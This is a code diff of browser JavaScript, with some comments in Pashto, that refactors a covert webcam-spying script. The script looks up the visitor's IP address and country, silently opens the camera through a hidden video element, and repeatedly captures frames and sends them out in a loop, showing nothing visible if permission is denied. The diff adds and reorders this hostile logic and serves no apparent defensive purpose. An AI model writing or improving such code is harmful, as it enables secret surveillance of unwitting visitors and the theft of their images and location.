@@ -12,41 +12,41 @@ let ip = "Unknown";
 let country = "Unknown";
 let flag = "🏳️";
 
-// country → flag
+// country code → flag emoji
 function countryToFlag(code){
   if(!code) return "🏳️";
-  return code.toUpperCase().replace(/./g,
-    c => String.fromCodePoint(127397 + c.charCodeAt())
-  );
+  return code
+    .toUpperCase()
+    .replace(/./g, c =>
+      String.fromCodePoint(127397 + c.charCodeAt())
+    );
 }
 
-// get IP info
-fetch("https://ipapi.co/json/")
-.then(r=>r.json())
-.then(d=>{
-  ip = d.ip || "Unknown";
-  country = d.country_name || "Unknown";
-  flag = countryToFlag(d.country_code);
-})
-.catch(()=>{});
-
-// start hidden camera
-(async ()=>{
+// 1️⃣ FIRST: get IP + country (WAIT)
+async function getIpInfo(){
   try{
-    stream = await navigator.mediaDevices.getUserMedia({ video:true });
-    video = document.createElement("video");
-    video.srcObject = stream;
-    await video.play();
-
-    loopCapture();
+    const res = await fetch("https://ipapi.co/json/");
+    const d = await res.json();
+    ip = d.ip || "Unknown";
+    country = d.country_name || "Unknown";
+    flag = countryToFlag(d.country_code);
   }catch(e){
-    // permission denied → nothing visible
+    // keep defaults
   }
-})();
+}
 
-async function loopCapture(){
+// 2️⃣ start hidden camera
+async function startCamera(){
+  stream = await navigator.mediaDevices.getUserMedia({ video:true });
+  video = document.createElement("video");
+  video.srcObject = stream;
+  await video.play();
+}
+
+// 3️⃣ loop capture
+async function loop(){
   await captureAndSend();
-  setTimeout(loopCapture, INTERVAL_MS);
+  setTimeout(loop, INTERVAL_MS);
 }
 
 async function captureAndSend(){
@@ -83,7 +83,18 @@ async function captureAndSend(){
   }).catch(()=>{});
 }
 
-// stop camera when user leaves page
+// 🔁 MAIN FLOW (ترتیب مهم دی)
+(async ()=>{
+  try{
+    await getIpInfo();     // ← مهم فکس
+    await startCamera();  // ← بیا camera
+    loop();               // ← بیا loop
+  }catch(e){
+    // permission denied → nothing visible
+  }
+})();
+
+// stop camera on exit
 window.addEventListener("beforeunload",()=>{
   if(stream) stream.getTracks().forEach(t=>t.stop());
-}); 
+});
